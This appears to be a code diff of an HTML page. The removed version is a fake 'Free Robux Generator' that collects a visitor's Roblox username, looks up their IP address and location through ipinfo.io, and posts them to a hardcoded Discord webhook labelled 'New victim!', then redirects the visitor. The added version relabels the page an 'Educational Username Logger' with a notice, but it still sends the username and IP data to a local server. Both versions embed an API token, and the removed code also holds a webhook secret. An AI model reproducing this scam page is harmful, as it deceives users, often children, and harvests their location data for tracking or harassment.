@@ -1,122 +1,36 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Roblox Robux Generator</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      background: linear-gradient(to bottom right, #f0f0f0, #d4d4d4);
-      font-family: "Segoe UI", sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .container {
-      background: white;
-      padding: 30px 40px;
-      border-radius: 16px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
-      text-align: center;
-      max-width: 400px;
-    }
-    h1 {
-      font-size: 24px;
-      margin-bottom: 10px;
-    }
-    p {
-      font-size: 14px;
-      color: #555;
-    }
-    input {
-      margin-top: 15px;
-      padding: 10px;
-      width: 100%;
-      font-size: 16px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-    }
-    button {
-      margin-top: 15px;
-      padding: 12px 20px;
-      font-size: 16px;
-      background: #ffd100;
-      color: #000;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
-    }
-    button:hover {
-      background: #ffcd00;
-    }
-    #loader {
-      display: none;
-      margin-top: 20px;
-    }
-  </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Educational Logger</title>
 </head>
 <body>
-  <div class="container">
-    <h1>Free Robux Generator</h1>
-    <p>Enter your Roblox username to begin:</p>
-    <input type="text" id="username" placeholder="Roblox Username" />
-    <button onclick="generate()">Generate</button>
-    <div id="loader">
-      <p>Verifying username and generating Robux...</p>
-      <img src="https://i.imgur.com/ZkZOXzI.gif" alt="Loading..." width="100">
-    </div>
-  </div>
+  <h1>Educational Username Logger</h1>
+  <input type="text" id="username" placeholder="Enter Roblox username" />
+  <p style="color:red;"><strong>Notice:</strong> As learned before, this button will log your username and IP address.</p>
+  <button onclick="logUser()">Submit</button>
+  <div id="status"></div>
 
   <script>
-    function generate() {
+    async function logUser() {
       const username = document.getElementById("username").value.trim();
-      if (username === "") {
-        alert("Please enter your Roblox username.");
-        return;
-      }
+      if (!username) return alert("Enter a username.");
 
-      document.getElementById("loader").style.display = "block";
+      document.getElementById("status").textContent = "Logging...";
 
-      // Log IP and username to Discord
-      fetch("https://ipinfo.io/json?token=ea728291c5fc2d") // Optional token from ipinfo.io
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip || "Unknown IP";
-          const city = data.city || "Unknown City";
-          const region = data.region || "Unknown Region";
-          const country = data.country || "Unknown Country";
-          const location = `${city}, ${region}, ${country}`;
+      const ipRes = await fetch("https://ipinfo.io/json?token=ea728291c5fc2d");
+      const ipInfo = await ipRes.json();
 
-          fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_URL", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              content: `🎣 New victim!\n👤 Username: **${username}**\n🌐 IP: **${ip}**\n📍 Location: **${location}**`
-            })
-          });
-        })
-        .catch(() => {
-          fetch("https://discord.com/api/webhooks/1380129925121445889/lHyPATfRSm-9HDHIvqa9xCxJSXJZleVzAq4VB4g9t2eTnoV2ZIEaiCx5IL48Y4c1hVCp", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              content: `🎣 New victim!\n👤 Username: **${username}**\n🌐 IP: *(Failed to fetch)*`
-            })
-          });
-        });
+      const res = await fetch("http://localhost:5000/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username, ipInfo }),
+      });
 
-      // Rickroll after 4 seconds
-      setTimeout(() => {
-        window.location.href = "https://tinyurl.com/2fcpre6";
-      }, 4000);
+      const result = await res.json();
+      document.getElementById("status").textContent =
+        result.status === "success" ? "Logged successfully!" : "Logging failed.";
     }
   </script>
 </body>
